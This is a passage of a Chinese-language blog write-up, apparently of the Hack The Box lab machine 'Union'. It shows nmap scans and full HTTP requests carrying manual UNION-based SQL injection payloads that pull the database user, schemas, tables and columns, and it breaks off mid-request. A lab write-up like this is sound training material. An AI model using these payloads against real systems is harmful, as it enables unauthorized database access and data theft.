@@ -1,0 +1,826 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：手工SQL注入、SQL注入load_file函数利用、网站文件代码分析、XFF命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Union-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/10/13/Union-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：手工SQL注入、SQL注入load_file函数利用、网站文件代码分析、XFF命令执行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/9.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/10.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/11.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/12.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/13.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/14.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Union-htb-writeup/15.png">
+<meta property="article:published_time" content="2024-10-13T15:50:55.000Z">
+<meta property="article:modified_time" content="2025-02-25T08:47:45.892Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Union-htb-writeup/1.png">
+  
+  
+  
+  <title>Union-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
+                    
+                    <span>SQLMap命令生成器</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/cvssjs/" target="_self">
+                    
+                    <span>CVSSv3.1 漏洞评分</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Union-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-13 23:50" pubdate>
+          2024年10月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          99 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Union-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：手工SQL注入、SQL注入load_file函数利用、网站文件代码分析、XFF命令执行</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://pencer.io/ctf/ctf-htb-union/#reverse-shell</code></p>
+<p>参考链接：<code>https://0xdf.gitlab.io/2021/11/22/htb-union.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、靶机介绍</p>
+<p><code>关于 Union</code><br><code>Union 是一台中等难度的 Linux 机器，其 Web 应用程序易受 SQL 注入攻击。机器上设有过滤器，可防止 SQLMap 转储数据库。用户需要手动编写 union 语句，以从数据库和网站源代码中提取信息。数据库包含一个标志，可用于对机器进行身份验证，在身份验证后，Web 服务器将运行 iptables 命令以启用端口 22。SSH 的凭据位于用于对 MySQL 进行身份验证的 PHP 配置文件中。进入机器后，用户可以检查 Web 应用程序的源代码，并通过设置 X-FORWARDED-FOR 标头来发现，他们可以对 Web 服务器用于将 IP 地址列入白名单的系统命令执行命令注入。</code></p>
+<p>2、测试下靶机连通率</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(kali㉿offsec)-[~/Desktop]<br>└─$<span class="hljs-built_in"> ping </span>10.10.11.128 -c 4<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>10.10.11.128 (10.10.11.128) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.128: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=146 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.128: <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=102 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.128: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=116 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.128: <span class="hljs-attribute">icmp_seq</span>=4 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=116 ms<br><br>--- 10.10.11.128<span class="hljs-built_in"> ping </span>statistics ---<br>4 packets transmitted, 4 received, 0% packet loss, time 3000ms<br>rtt min/avg/max/mdev = 102.477/119.972/145.730/15.840 ms<br></code></pre></td></tr></table></figure>
+
+<p>3、扫描下开放端口情况</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs stata">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- -Pn --min-rate=10000 -oG allports 10.10.11.128<br>[sudo] kali 的密码：<br>Starting Nmap 7.94SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-10-13 09:33 CST</span><br>Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> 10.10.11.128<br>Host is up (0.50s latency).<br>Not shown: 65534 filtered tcp ports (<span class="hljs-keyword">no</span>-response)<br>PORT   STATE SERVICE<br>80/tcp <span class="hljs-keyword">open</span>  http<br><br>Nmap done: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.14 seconds<br>                                                                                                                                                           <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ grep -oP &#x27;([0-9]+)/<span class="hljs-keyword">open</span>&#x27; allports | awk -F/ &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1&#125;</span>&#x27; | tr &#x27;\<span class="hljs-keyword">n</span>&#x27; &#x27;,&#x27;<br>80,                                                                                                                                                           <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -Pn -sV -<span class="hljs-keyword">sC</span> 10.10.11.128 -p 80 -<span class="hljs-keyword">oN</span> PortList.txt --min-rate=10000<br>Starting Nmap 7.94SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-10-13 09:34 CST</span><br>Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> 10.10.11.128<br>Host is up (0.79s latency).<br><br>PORT   STATE SERVICE <span class="hljs-keyword">VERSION</span><br>80/tcp <span class="hljs-keyword">open</span>  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-keyword">set</span><br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please <span class="hljs-keyword">report</span> any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.97 seconds<br></code></pre></td></tr></table></figure>
+
+<p>4、只开放了一个端口，那就访问下吧</p>
+<p><a target="_blank" rel="noopener" href="http://10.10.11.128/">http://10.10.11.128/</a></p>
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、这里经过初步尝试，疑似存在SQL注入漏洞</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.128<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>21<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.128<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.128/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jv95ej2q3d1mmegka4qv15ikj8<br><br><span class="language-ini"><span class="hljs-attr">player</span>=shiyan<span class="hljs-string">&#x27;;-- -&#x27;</span><span class="hljs-comment">;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、查询当前用户</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.128<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>33<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.128<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.128/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jv95ej2q3d1mmegka4qv15ikj8<br><br><span class="language-ada">player=&#x27; union <span class="hljs-keyword">select</span> user();<span class="hljs-comment">-- -</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、查询数据库名</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.128<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>85<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.128<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.128/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jv95ej2q3d1mmegka4qv15ikj8<br><br><span class="language-q">player=&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> group_concat(SCHEMA_NAME) <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.schemata;-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、查询表名</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.128<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>112<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.128<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.128/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jv95ej2q3d1mmegka4qv15ikj8<br><br><span class="language-q">player=&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;november&#x27;;-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、查询列名</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.128<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>131<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.128<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.128/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jv95ej2q3d1mmegka4qv15ikj8<br><br><span class="language-routeros"><span class="hljs-attribute">player</span>=<span class="hljs-string">&#x27; union select group_concat(table_name, &#x27;</span>:&#x27;, column_name) <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;november&#x27;</span>;-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、查询flag信息</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.128<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>54<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.128<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.128/<br><span class="hljs-attribute">Cookie</span><span 